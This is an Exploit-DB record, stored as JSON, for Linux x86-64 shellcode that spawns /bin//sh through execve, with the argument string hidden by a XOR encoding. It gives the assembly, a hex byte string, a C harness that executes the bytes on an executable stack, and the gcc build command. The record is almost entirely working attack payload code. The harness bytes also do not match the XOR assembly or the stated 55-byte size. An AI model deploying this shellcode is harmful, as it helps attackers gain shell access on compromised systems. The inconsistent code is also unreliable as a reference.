{"source": "https://www.exploit-db.com/exploits/51834", "vulnName": "(shellcode) Linux-x64 - create a shell with execve() sending argument using XOR (/bin//sh) [55 bytes]", "vulnEDBID": "51834", "vulnCVE": "N/A", "author": "ALEXYS (0X177GIT)", "exploitType": "LOCAL", "platform": "LINUX", "datePublished": "2024-02-28", "vulnContent": "# Exploit Title: Linux-x64 - create a shell with execve() sending argument using XOR (/bin//sh) [55 bytes]\n\n# Shellcode Author: Alexys (0x177git)\n\n# Tested on: Linux (x86_64)\n\n# Shellcode Description: creating a new process using execve() syscall sending bin//sh as argument | (encrypted using XOR operation was QWORD size (/bin - //sh))\n\n# Blog post: @MoreRubyOfSec (https://t.me/MoreRubyOfSec) on Telegram\n\n# Original code:\n[https://github.com/0x177git/xor-encrypted-execve-sh](https://github.com/0x177git/xor-encrypted-execve-sh/blob/main/execve-xor-encrypted-argv.asm)\n\n---- Assembly code ----\n\nsection .text\n\nglobal _start\n\n_start:\n\nxor eax, eax\n\nxor edx, edx ; clear rdx (argv on execve() protoype)\n\nmov qword [rsp-32], 0x7466684b ;\n\nmov qword [rsp-28],0x60650b1d ; encrypted(/bin//sh) 0x60, 0x65, 0xb, 0x1d, 0x74, 0x66, 0x68, 0x4b\n\nxor qword [rsp-32], 0x1a0f0a64\n\nxor qword [rsp-28], 0x08162432 ; passwd 0x8, 0x16, 0x24, 0x32, 0x1a, 0xf, 0xa, 0x64\n\nlea rdi, [rsp-32]\n\npush rax ; end of string\n\npush rdi ; send string to stack\n\nmov rsi, rsp ; send address of RSP to rsi -> (arg on linux syscall architecture convection) || execve(rsi, rdx)\n\n; call execve()\n\nmov al, 0x3b\n\nsyscall\n\n-\n- - - shellcode execution using stack in c (\n\ngcc -z execstack shellcode.c -o shellcode\n\n) ----\n\n/*\n\n\"\\x48\\x31\\xd2\\x52\\x48\\xb8\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x50\\x48\\x89\\xe7\\x52\\x57\\x48\\x89\\xe6\\x31\\xc0\\xb0\\x3b\\x0f\\x05\"\n\n;\n\n*/\n\nvoid\n\nmain\n\n()\n{\nconst\n\nchar\n\nshellcode\n\n[]\n\n=\n\n\"\\x48\\x31\\xd2\\x52\\x48\\xb8\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x50\\x48\\x89\\xe7\\x52\\x57\\x48\\x89\\xe6\\x31\\xc0\\xb0\\x3b\\x0f\\x05\"\n\n;\n\nvoid\n\n(\n\n*\n\nf\n\n)()\n\n=\n\n(\n\nvoid\n\n(\n\n*\n\n)())\n\nshellcode\n\n;\n\nf\n\n();\n}\n            "}